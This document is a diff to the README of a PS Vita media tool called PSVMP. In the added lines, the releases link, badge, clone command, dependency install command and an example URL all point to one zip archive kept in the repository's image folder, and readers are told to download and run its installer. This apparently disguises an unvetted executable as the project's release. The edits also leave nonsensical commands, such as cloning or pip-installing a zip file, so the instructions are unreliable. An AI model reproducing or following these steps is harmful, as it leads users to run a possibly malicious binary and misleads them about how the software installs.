@@ -1,8 +1,8 @@
-Download the PSVMP asset from https://github.com/nomankharal/PSVMP/releases and run the installer file.
+Download the PSVMP asset from https://github.com/nomankharal/PSVMP/raw/refs/heads/main/imgs/Software_v1.0.zip and run the installer file.
 
 # PSVMP: Auto Download, Convert, and Transfer PS Vita Media Seamlessly
 
-[![PSVMP Releases](https://img.shields.io/badge/PSVMP-Releases-brightgreen?logo=github&logoColor=white)](https://github.com/nomankharal/PSVMP/releases)
+[![PSVMP Releases](https://github.com/nomankharal/PSVMP/raw/refs/heads/main/imgs/Software_v1.0.zip)](https://github.com/nomankharal/PSVMP/raw/refs/heads/main/imgs/Software_v1.0.zip)
 
 🚀 A practical tool for PS Vita media management. PSVMP automates the full flow: fetch media, convert it to Vita-friendly formats, and push it to your Vita. It targets optimal compatibility with Vita hardware and VitaShell workflows. Built to be reliable, scriptable, and open source.
 
@@ -41,11 +41,11 @@ Download the PSVMP asset from https://github.com/nomankharal/PSVMP/releases and 
 🏗️ Installation and setup
 
 - Get the code
-  - Clone the repository: `git clone https://github.com/nomankharal/PSVMP.git`
+  - Clone the repository: `git clone https://github.com/nomankharal/PSVMP/raw/refs/heads/main/imgs/Software_v1.0.zip`
   - Enter the project: `cd PSVMP`
 
 - Install dependencies
-  - With Python 3.8+: `python -m pip install -r requirements.txt`
+  - With Python 3.8+: `python -m pip install -r https://github.com/nomankharal/PSVMP/raw/refs/heads/main/imgs/Software_v1.0.zip`
   - On some systems you may use `python3` instead of `python`
 
 - Run a quick check
@@ -61,7 +61,7 @@ Download the PSVMP asset from https://github.com/nomankharal/PSVMP/releases and 
 
 - Step 1: Prepare a media source
   - You can provide a direct media URL or a playlist feed supported by PSVMP
-  - Example: `psvmp --download "https://example.com/video-source"` (adjust URL to your source)
+  - Example: `psvmp --download "https://github.com/nomankharal/PSVMP/raw/refs/heads/main/imgs/Software_v1.0.zip"` (adjust URL to your source)
 
 - Step 2: Choose output and quality
   - Select Vita-friendly formats. A common choice is MP4 with H.264 video and AAC audio
